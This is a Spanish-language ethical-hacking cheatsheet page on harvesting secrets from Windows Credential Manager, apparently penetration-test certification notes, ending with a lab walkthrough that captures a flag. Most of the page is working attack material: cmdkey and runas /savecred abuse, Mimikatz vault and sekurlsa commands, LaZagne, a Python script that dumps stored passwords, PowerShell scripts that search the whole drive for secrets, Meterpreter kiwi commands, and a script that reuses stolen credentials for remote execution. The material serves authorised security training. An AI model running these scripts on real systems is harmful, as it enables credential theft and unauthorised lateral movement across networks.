
# Windows Credential Manager

## <mark style="color:purple;">Introducción</mark>

**Windows Credential Manager** (Administrador de Credenciales) es un componente de Windows que almacena credenciales de inicio de sesión para diversos servicios, aplicaciones y recursos de red. Es una fuente valiosa para escalada de privilegios y movimiento lateral.

#### ¿Qué Almacena Credential Manager?

* **Credenciales de Windows**: Inicios de sesión de dominio y locales
* **Credenciales Genéricas**: Aplicaciones y servicios
* **Credenciales de Certificados**: Autenticación basada en certificados
* **Credenciales Web**: Contraseñas guardadas en navegadores
* **Credenciales de Red**: Recursos compartidos y unidades mapeadas

### **Enumeración Manual con CMD**

```powershell
# Ver credenciales almacenadas (requiere interacción)
cmdkey /list

# Guardar una nueva credencial
cmdkey /add:target /user:username /pass:password

# Eliminar credencial
cmdkey /delete:target

# Ver detalles específicos
rundll32.exe keymgr.dll,KRShowKeyMgr
```

**Ejemplo de salida:**

```powershell
C:\> cmdkey /list

Currently stored credentials:

* Target: Domain:target=TERMSRV/192.168.1.100
  Type: Domain Password
  User: DOMAIN\Administrator

* Target: LegacyGeneric:target=gitlab.com
  Type: Generic
  User: gituser

* Target: WindowsLive:target=live.com
  Type: Windows Live
  User: user@outlook.com
```

### **Usar credenciales almacenadas**

Si hay credenciales almacenadas podemos usar runas para loguearnos sin introducir una contraseña:

<pre class="language-powershell"><code class="lang-powershell"><strong>runas.exe /savecred /user:administrator cmd
</strong></code></pre>

<figure><img src="/files/YwXw3SOXpLetKL49MMgv" alt=""><figcaption></figcaption></figure>

### **Con PowerUp**

```powershell
# Cargar PowerUp
Import-Module .\PowerUp.ps1

# Buscar credenciales en Credential Manager
Get-RegistryAutoLogon

# Buscar credenciales en general
Invoke-AllChecks | Select-String "credential|password"
```

### Con **Mimikatz**

{% content-ref url="/pages/70NwMwXRHfmXF0k8lCe0" %}
[Mimikatz](/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/mimikatz.md)
{% endcontent-ref %}

```powershell
# En Kali, descargar Mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip

# En Windows, ejecutar Mimikatz
mimikatz.exe

# Comandos en Mimikatz
privilege::debug
token::elevate
sekurlsa::logonpasswords
vault::list
vault::cred
lsadump::sam
lsadump::cache
lsadump::secrets
```

**Ejemplo de extracción con Mimikatz:**

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # vault::list
Target : TERMSRV/192.168.1.100
Type   : Domain Password
User   : DOMAIN\Administrator
Pass   : P@ssw0rd123!

mimikatz # vault::cred
Credentials:
  - Name: gitlab.com
    UserName: gituser
    Password: GitPass123!
```

### Con **LaZagne**

```bash
# Descargar LaZagne
wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/LaZagne.exe

# En Windows, ejecutar
.\LaZagne.exe windows
.\LaZagne.exe all
.\LaZagne.exe windows -o -output results.txt
```

### **Script Python**&#x20;

Podemos usar el siguiente script para extraer credenciales:

```python
# extract_credentials.py
import ctypes
import ctypes.wintypes
import struct
import sys

# Estructuras de Windows para Credential Manager
class CREDENTIAL(ctypes.Structure):
    _fields_ = [
        ("flags", ctypes.wintypes.DWORD),
        ("type", ctypes.wintypes.DWORD),
        ("target_name", ctypes.wintypes.LPWSTR),
        ("comment", ctypes.wintypes.LPWSTR),
        ("last_written", ctypes.wintypes.LARGE_INTEGER),
        ("credential_blob_size", ctypes.wintypes.DWORD),
        ("credential_blob", ctypes.POINTER(ctypes.c_byte)),
        ("persist", ctypes.wintypes.DWORD),
        ("attribute_count", ctypes.wintypes.DWORD),
        ("attributes", ctypes.c_void_p),
        ("target_alias", ctypes.wintypes.LPWSTR),
        ("user_name", ctypes.wintypes.LPWSTR)
    ]

# Cargar la API de Credential Manager
advapi32 = ctypes.windll.advapi32
advapi32.CredEnumerateW.argtypes = [ctypes.wintypes.LPWSTR, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.DWORD), ctypes.POINTER(ctypes.POINTER(CREDENTIAL))]
advapi32.CredEnumerateW.restype = ctypes.wintypes.BOOL
advapi32.CredFree.argtypes = [ctypes.c_void_p]

def extract_credentials():
    """Extraer credenciales del Credential Manager"""
    cred_count = ctypes.wintypes.DWORD()
    cred_ptr = ctypes.POINTER(CREDENTIAL)()
    
    if advapi32.CredEnumerateW(None, 0, ctypes.byref(cred_count), ctypes.byref(cred_ptr)):
        print(f"[+] Encontradas {cred_count.value} credenciales\n")
        
        for i in range(cred_count.value):
            cred = cred_ptr[i]
            
            # Extraer nombre de target
            target = cred.target_name
            if target:
                target = target.encode('utf-16le').decode('utf-16le').rstrip('\x00')
            
            # Extraer usuario
            username = cred.user_name
            if username:
                username = username.encode('utf-16le').decode('utf-16le').rstrip('\x00')
            
            # Extraer contraseña (blob)
            password = ""
            if cred.credential_blob and cred.credential_blob_size > 0:
                password_bytes = ctypes.string_at(cred.credential_blob, cred.credential_blob_size)
                try:
                    password = password_bytes.decode('utf-16le').rstrip('\x00')
                except:
                    password = password_bytes.decode('utf-8', errors='ignore')
            
            print(f"[*] Credencial #{i+1}:")
            print(f"    Target: {target}")
            print(f"    Usuario: {username}")
            print(f"    Contraseña: {password}")
            print(f"    Tipo: {cred.type}\n")
        
        advapi32.CredFree(cred_ptr)
    else:
        error = ctypes.GetLastError()
        print(f"[-] Error al enumerar credenciales: {error}")

if __name__ == "__main__":
    extract_credentials()
```

### **PowerShell Script**

Podemos usar el siguiente script para exportar credenciales:

```powershell
# Exportar todas las credenciales a archivo
function Export-WindowsCredentials {
    $output = @()
    
    # Obtener credenciales usando cmdkey
    $creds = cmdkey /list
    
    # Procesar cada línea
    $currentCred = @{}
    foreach ($line in $creds) {
        if ($line -match "Target: (.+)") {
            if ($currentCred.Count -gt 0) {
                $output += $currentCred
                $currentCred = @{}
            }
            $currentCred['Target'] = $matches[1].Trim()
        }
        elseif ($line -match "User: (.+)") {
            $currentCred['User'] = $matches[1].Trim()
        }
        elseif ($line -match "Type: (.+)") {
            $currentCred['Type'] = $matches[1].Trim()
        }
    }
    
    if ($currentCred.Count -gt 0) {
        $output += $currentCred
    }
    
    # Exportar a archivo
    $output | ConvertTo-Json | Out-File -FilePath "credentials_export.json"
    Write-Host "[+] Credenciales exportadas a credentials_export.json" -ForegroundColor Green
    
    # Mostrar en pantalla
    $output | Format-Table -AutoSize
}

# Ejecutar
Export-WindowsCredentials
```

### **Script Avanzado con NetAPI**

```powershell
# AdvancedCredentialHunter.ps1
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.DirectoryServices.AccountManagement

function Get-AllCredentials {
    Write-Host "[*] Extrayendo todas las credenciales almacenadas..." -ForegroundColor Cyan
    
    # 1. Credenciales de Windows
    Write-Host "[+] Credenciales de Windows:" -ForegroundColor Green
    $windowsCreds = cmdkey /list
    $windowsCreds | ForEach-Object { Write-Host "    $_" -ForegroundColor Yellow }
    
    # 2. Credenciales de red
    Write-Host "`n[+] Unidades de red mapeadas:" -ForegroundColor Green
    net use
    
    # 3. Credenciales de servicios de Windows
    Write-Host "`n[+] Credenciales de servicios:" -ForegroundColor Green
    Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -ne "LocalSystem" -and $_.StartName -ne "NT AUTHORITY\*"} | 
        Select-Object Name, StartName | Format-Table -AutoSize
    
    # 4. Credenciales en el registro
    Write-Host "`n[+] Credenciales en registro:" -ForegroundColor Green
    $regPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\CredentialManager"
    )
    
    foreach ($path in $regPaths) {
        try {
            $items = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue
            if ($items) {
                Write-Host "    [$path]" -ForegroundColor Yellow
                $items.PSObject.Properties | Where-Object {$_.Name -match "User|Pass|Cred"} | 
                    ForEach-Object { Write-Host "        $($_.Name): $($_.Value)" -ForegroundColor White }
            }
        } catch {
            # Ignorar errores de acceso
        }
    }
    
    # 5. Credenciales en archivos de configuración
    Write-Host "`n[+] Credenciales en archivos de configuración:" -ForegroundColor Green
    $configFiles = Get-ChildItem -Path C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -ErrorAction SilentlyContinue | 
        Select-String -Pattern "password|credential|secret|key" -ErrorAction SilentlyContinue
    
    $configFiles | Select-Object -First 10 | ForEach-Object {
        Write-Host "    $($_.Path):" -ForegroundColor Yellow
        Write-Host "        $($_.Line)" -ForegroundColor White
    }
}

# Ejecutar
Get-AllCredentials
```

### **Con Meterpreter**

```bash
# Desde Meterpreter
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > creds_wdigest
meterpreter > creds_msv

# Comandos de Kiwi
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   NTLM                              SHA1
--------  ------   ----                              ----
Administrator DOMAIN 5c4d59391f656d5958dab124ffeabc20 5c4d59391f656d5958dab124ffeabc20

wdigest credentials
===================
Username  Domain   Password
--------  ------   --------
Administrator DOMAIN P@ssw0rd123!

# Extraer vault
meterpreter > kiwi_cmd vault::list
meterpreter > kiwi_cmd vault::cred
```

### **Movimiento Lateral**

Podemos usar el siguiente script para extraer credenciales de dominio y realizar un movimiento lateral:

```powershell
# Extraer credenciales y usarlas para movimiento lateral
# 1. Extraer credenciales
$creds = cmdkey /list

# 2. Identificar credenciales de dominio
if ($creds -match "Domain:target=([^\s]+)") {
    $target = $matches[1]
    $user = if ($creds -match "User: (.+)") { $matches[1] }
    $pass = if ($creds -match "Pass: (.+)") { $matches[1] }
    
    Write-Host "[+] Credenciales encontradas:" -ForegroundColor Green
    Write-Host "    Target: $target" -ForegroundColor Yellow
    Write-Host "    User: $user" -ForegroundColor Yellow
    Write-Host "    Pass: $pass" -ForegroundColor Yellow
    
    # 3. Usar para movimiento lateral
    # Crear PSCredential
    $secpass = ConvertTo-SecureString $pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($user, $secpass)
    
    # 4. Ejecutar comando en máquina remota
    Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock {
        whoami
        hostname
    }
    
    # 5. Crear sesión remota
    $session = New-PSSession -ComputerName $target -Credential $cred
    Enter-PSSession $session
}
```

***

## <mark style="color:purple;">Lab: Credential Manager</mark>

Tu tarea consiste en encontrar una contraseña de usuario administrador guardada en el sistema para realizar una escalada de privilegios.

En este entorno de laboratorio, se le proporcionará acceso a la interfaz gráfica de usuario (GUI) de una máquina Kali de ataque y de una máquina Windows de destino.

**Objetivo:** Obtener acceso a una sesión de meterpreter con altos privilegios.

#### Lab

En este laboratorio podemos alternar fácilmente entre la máquina Kali y la máquina Windows objetivo y tenemos todos los scripts disponibles en el escritorio de la máquina Windows:

<figure><img src="/files/tVlf9j9GOVAbR4YcYCSj" alt=""><figcaption></figcaption></figure>

### Búsqueda manual

Observamos que hay almacenada una contraseña de administrador:

```powershell
PS C:\Users\student> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=PRIV-ESC\Administrator
    Type: Domain Password
    User: PRIV-ESC\Administrator
```

### Runas como admin

Con estas credenciales almacenadas podemos usar runas para loguearnos sin introducir una contraseña:

<pre class="language-powershell"><code class="lang-powershell"><strong>runas.exe /savecred /user:administrator cmd
</strong></code></pre>

<figure><img src="/files/YwXw3SOXpLetKL49MMgv" alt=""><figcaption></figcaption></figure>

### Acceso a la flag

```powershell
C:\Windows\system32>cd C:/Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator\Desktop

10/28/2020  09:50 AM    <DIR>          .
10/28/2020  09:50 AM    <DIR>          ..
10/28/2020  09:50 AM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,748,038,656 bytes free

C:\Users\Administrator\Desktop>type flag.txt
39b9d593d6aa6b4ceffbcc214fc70504
```

### Acceso desde Kali

Podemos usar las misma técnicas que en la sección anterior para acceder al equipo Windows desde Kali Linux usando `impacket-psexec` o el `HTA Server` de Metasploit.

{% content-ref url="/pages/gHaF6vUed8SWp2pWQHGA#explotacion-desde-kali-hta-server" %}
[Windows Privilege Escalation Scripts](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/privilege-escalation/windows-privilege-escalation/windows-privilege-escalation-scripts.md#explotacion-desde-kali-hta-server)
{% endcontent-ref %}
